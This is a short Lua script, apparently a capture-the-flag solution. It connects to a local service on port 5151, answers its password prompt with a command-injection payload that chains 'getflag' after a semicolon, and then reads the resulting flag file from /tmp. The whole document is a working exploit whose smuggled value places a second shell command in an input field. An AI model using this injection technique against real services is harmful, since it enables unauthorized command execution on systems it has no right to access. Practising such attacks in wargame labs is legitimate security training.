local socket = require("socket")

-- Connect to the server
local client = assert(socket.tcp())
client:connect("127.0.0.1", 5151)

-- Receive the "Password: " prompt
local response = client:receive()
print("Server says:", response)

-- Craft the injection payload
local payload = "hey; getflag > /tmp/flag_level_11"

-- Send the payload to the server
client:send(payload .. "\n")

-- Receive the server response after sending the payload
local response, err = client:receive()
if response then
    print("Server response:", response)
else
    print("Error:", err)
end

-- Close the connection
client:close()

-- Check if the flag file exists and print the flag
local file = io.open("/tmp/flag_level_11", "r")
if file then
    local flag = file:read("*all")
    print("Flag content:", flag)
    file:close()
else
    print("Flag file not found.")
end
